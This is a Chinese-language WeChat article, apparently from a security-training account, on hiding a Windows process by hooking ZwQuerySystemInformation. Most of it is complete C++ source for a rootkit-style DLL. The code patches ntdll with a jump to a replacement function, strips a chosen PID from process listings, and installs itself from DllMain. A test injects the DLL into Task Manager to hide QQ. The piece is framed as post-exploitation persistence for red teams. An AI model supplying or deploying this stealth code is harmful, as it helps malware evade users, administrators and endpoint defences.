#  红队干货｜通过HOOK底层API实现进程隐藏

原创 Buffer  [ HACK学习计划 ](javascript:void\(0\);)

**HACK学习计划** ![]()

微信号 HACK1961

功能介绍
HACK学习计划养成，致力于培养渗透测试工程师，Web安全工程师，信息安全架构师，二进制安全，HACK硬件安全，移动互联网安全等，助力于为国家网络安全部队输送人才。

____

__

收录于话题

#后渗透 ,1

#权限维持 ,1

#进程隐藏 ,1

## 前言

一次跟师傅交流时师傅谈到有些EDR或AV,他们保护目标主机,甚至无进程,不经想到病毒实际上也常用这种技术。当然,做到隐藏,一个简单的dll注入或者劫持就可以,但本文主要讲解关于进程的隐藏。

PE文件隐藏可以通过

•进程伪装: 将进程名替换成其他正常进程的名称(修改PEB路径和命令行信息)•傀儡进程:
通过将主进程挂起,替换内存数据,卸载镜像,修改上下文,并执行真正我们想要执行的进程,这也是一些壳的原理•HOOK:
通过HOOK三环最底层API`ZwQuerySystemInformation`实现隐藏,这是本文的重点•COM劫持、DLL劫持、DLL注入......

## 实现原理

在正向开发中,要想做到进程遍历,往往需要使用`EnumProcess`或是快照`CreateToolhelp32Snapshot`这些函数
而这些函数的底层(ring 3),都是调用的`ZwQuerySystemInformation`

    
    
    NTSTATUS WINAPI ZwQuerySystemInformation(  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,  _Inout_   PVOID                    SystemInformation,  _In_      ULONG                    SystemInformationLength,  _Out_opt_ PULONG                   ReturnLength);

如果通过hook进行对`ZwQuerySystemInformation`的重定向,那么就可以改变执行流,返回的信息中已经被我们篡改。32位下和64位下需要修改的字节数是不同的,使用xdbg断点找到对应的硬编码

32位下: 需要修改5个字节硬编码

    
    
    0xe9 xx xx xx xx

![](https://gitee.com/fuli009/images/raw/master/public/20210902012024.png)![](https://gitee.com/fuli009/images/raw/master/public/20210902012026.png)

64位下: 需要修改12个字节的硬编码

    
    
    0x48 0xb8, xx xx xx xx xx xx xx xx0xFF 0xE0

![](https://gitee.com/fuli009/images/raw/master/public/20210902012027.png)![](https://gitee.com/fuli009/images/raw/master/public/20210902012028.png)

64位下该函数的名称已经改为`RtlGetNativeSystemInformation`。将`hookZwQuerySystemInformation`函数写在dll中,这样方便注入到任何进程中。

## 实现代码

hook函数

    
    
    void hookZwQuerySystemInformation(){    //获取ZwQuerySystemInformation的地址    HMODULE hntdll = LoadLibraryA("ntdll.dll");    if (!hntdll) {        std::cout << "[!] Load ntdll Faild..\n";        return;    }#ifdef _WIN64    typedef DWORD(WINAPI* typedef_ZwQuerySystemInformation)(        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,        _Inout_   PVOID                    SystemInformation,        _In_      ULONG                    SystemInformationLength,        _Out_opt_ PULONG                   ReturnLength        );#else    typedef DWORD(WINAPI* typedef_ZwQuerySystemInformation)(        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,        _Inout_   PVOID                    SystemInformation,        _In_      ULONG                    SystemInformationLength,        _Out_opt_ PULONG                   ReturnLength        );#endif    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hntdll, "ZwQuerySystemInformation");    if (!ZwQuerySystemInformation) {        std::cout << "[!] Get ZwQuerySystemInformation Addr Faild..\n";        return;    }#ifdef _WIN64    BYTE pData[12] = { 0x48,0xb8,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0xFF,0xE0 };    ULONGLONG InfoAddr = (ULONGLONG)New_ZwQuerySystemInformation;    ::RtlCopyMemory(&pData[2], &InfoAddr, sizeof(InfoAddr));    // 保存前 12 字节数据    ::RtlCopyMemory(g_Oldwin64, ZwQuerySystemInformation, sizeof(pData));#else    BYTE pData[5] = { 0xe9,0x0,0x0,0x0,0x0 };    //算出偏移地址    DWORD dwOffeset = (DWORD)New_ZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - 5;    //得到完整的pData    RtlCopyMemory(&pData[1], &dwOffeset, sizeof(dwOffeset));    //保存原来的硬编码    RtlCopyMemory(g_Oldwin32, ZwQuerySystemInformation, sizeof(pData));#endif     DWORD dwOldProtect = NULL;    //修改为可写属性,不然会0xC00005访问错误    VirtualProtect(ZwQuerySystemInformation, sizeof(pData), PAGE_EXECUTE_READWRITE, &dwOldProtect);    //修改硬编码    RtlCopyMemory(ZwQuerySystemInformation, pData, sizeof(pData));    //还原保护属性    VirtualProtect(ZwQuerySystemInformation, sizeof(pData), dwOldProtect, &dwOldProtect);}

unhook函数

    
    
    void unhookZwQuerySystemInformation(){    //获取ZwQuerySystemInformation的地址    HMODULE hntdll = LoadLibraryA("ntdll.dll");    if (!hntdll) {        std::cout << "[!] Load ntdll Faild..\n";        return;    }#ifdef _WIN64    typedef DWORD(WINAPI* typedef_ZwQuerySystemInformation)(        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,        _Inout_   PVOID                    SystemInformation,        _In_      ULONG                    SystemInformationLength,        _Out_opt_ PULONG                   ReturnLength        );#else    typedef DWORD(WINAPI* typedef_ZwQuerySystemInformation)(        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,        _Inout_   PVOID                    SystemInformation,        _In_      ULONG                    SystemInformationLength,        _Out_opt_ PULONG                   ReturnLength        );#endif    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hntdll, "ZwQuerySystemInformation");    if (!ZwQuerySystemInformation) {        std::cout << "[!] Get ZwQuerySystemInformation Addr Faild..\n";        return;    }    DWORD dwOldProtect = NULL;    //方便就直接改12个字节的可写属性    VirtualProtect(ZwQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);    //还原原来的硬编码#ifdef _WIN64    RtlCopyMemory(ZwQuerySystemInformation, g_Oldwin64, sizeof(g_Oldwin64));#else    RtlCopyMemory(ZwQuerySystemInformation, g_Oldwin32, sizeof(g_Oldwin32));#endif     //还原属性    VirtualProtect(ZwQuerySystemInformation, 12, dwOldProtect, &dwOldProtect);}

自己可控的函数,即`New_ZwQuerySystemInformation`

    
    
    NTSTATUS WINAPI New_ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength){    NTSTATUS status = NULL;    PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;    DWORD dwHideProcessId = 29936;    //先卸载钩子    unhookZwQuerySystemInformation();    // 获取 ntdll.dll 的加载基址, 若没有则返回    HMODULE hntdll = LoadLibraryA("ntdll.dll");    if (!hntdll) {        std::cout << "[!] Load ntdll Faild..\n";        return status;    }    // 获取 ZwQuerySystemInformation 函数地址#ifdef _WIN64    typedef DWORD(WINAPI* typedef_ZwQuerySystemInformation)(        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,        _Inout_   PVOID                    SystemInformation,        _In_      ULONG                    SystemInformationLength,        _Out_opt_ PULONG                   ReturnLength        );#else    typedef DWORD(WINAPI* typedef_ZwQuerySystemInformation)(        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,        _Inout_   PVOID                    SystemInformation,        _In_      ULONG                    SystemInformationLength,        _Out_opt_ PULONG                   ReturnLength        );#endif    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hntdll, "ZwQuerySystemInformation");    if (!ZwQuerySystemInformation) {        std::cout << "[!] Get ZwQuerySystemInformation Addr Faild..\n";        return status;    }    //调用原来的函数,第二个参数是返回请求的信息    status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);    if (NT_SUCCESS(status) && 5 == SystemInformationClass)    {        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;        while (TRUE)        {            // 判断是否是要隐藏的进程PID,是就把该进程信息删除            if (dwHideProcessId == (DWORD)pCur->UniqueProcessId)            {                if (0 == pCur->NextEntryOffset)                {                    pPrev->NextEntryOffset = 0;                }                else                {                    pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;                }            }            else            {                pPrev = pCur;            }            if (0 == pCur->NextEntryOffset)            {                break;            }            pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCur + pCur->NextEntryOffset);        }    }    //挂钩    hookZwQuerySystemInformation();    return status;}

以上函数全部写在dll中,`dllmain`主函数:

    
    
    BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        hookZwQuerySystemInformation();        g_hModule = hModule;        break;    case DLL_THREAD_ATTACH:        break;    case DLL_THREAD_DETACH:        break;    case DLL_PROCESS_DETACH:        unhookZwQuerySystemInformation();        break;    }    return TRUE;}

## 测试

•win10•64位dll•Injectdll(进程注入程序)•Taskmgr.exe

要注意的是dll的位数。找到任务管理器pid:

![](https://gitee.com/fuli009/images/raw/master/public/20210902012029.png)

这里选择隐藏QQ程序

![](https://gitee.com/fuli009/images/raw/master/public/20210902012030.png)

注入程序后

![](https://gitee.com/fuli009/images/raw/master/public/20210902012032.png)![](https://gitee.com/fuli009/images/raw/master/public/20210902012033.png)

可以看到QQ进程信息已经剔除

## 思考

如何将所有进程钩住? 使用全局钩子,这里我认为是两个知识点,就不继续展开说了。

![](https://gitee.com/fuli009/images/raw/master/public/20210902012034.png)

由于大号被封禁，暂时先用这个号发文章

  

后期新号再通知各位小伙伴！  

  

 **点赞     在看     转发**

 **  
**

![](https://gitee.com/fuli009/images/raw/master/public/20210902012035.png)

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

红队干货｜通过HOOK底层API实现进程隐藏

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

